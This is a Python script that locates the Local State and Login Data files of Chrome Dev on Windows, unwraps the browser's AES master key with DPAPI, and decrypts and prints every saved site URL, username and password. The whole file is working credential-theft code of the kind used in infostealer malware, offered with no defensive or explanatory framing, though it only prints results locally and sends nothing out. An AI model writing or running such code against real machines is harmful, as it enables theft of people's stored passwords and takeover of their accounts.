import json
from base64 import b64decode
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import os
import sys
import shutil
import sqlite3

masterkeyPath = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome Dev\\User Data\\Local State'
loginDataPath = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome Dev\\User Data\\Default\\Login Data'

########## Decrypt passwords with AES MasterKey ##########
def decryptPass(buff, key):
    cipher = AES.new(key, AES.MODE_GCM, buff[3:15])
    decryptedPass = cipher.decrypt(buff[15:])[:-16].decode()
    return decryptedPass

########## Get AES MasterKey from Local State ##########
if os.path.exists(masterkeyPath):
    with open(masterkeyPath) as f:
        jsonData = json.load(f)["os_crypt"]["encrypted_key"]
        masterkey = CryptUnprotectData(b64decode(jsonData)[5:], None, None, None, 0)[1]
else:
    sys.exit('Error: MasterKey was not found in the given path!')

########## Connect to DB and get result ##########
output = ''
if os.path.exists(loginDataPath):
    shutil.copy2(loginDataPath, loginDataPath + "-temp")
    conn = sqlite3.connect(loginDataPath + "-temp")
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for result in cursor.fetchall():
        url = result[0]
        login = result[1]
        password = decryptPass(result[2], masterkey)
        output += url + ' | ' + login + ' | ' + password + '\n'
    conn.close()
    os.remove(loginDataPath + "-temp")
    print(output)
else:
    sys.exit('Error: Login Data was not found in the given path!')
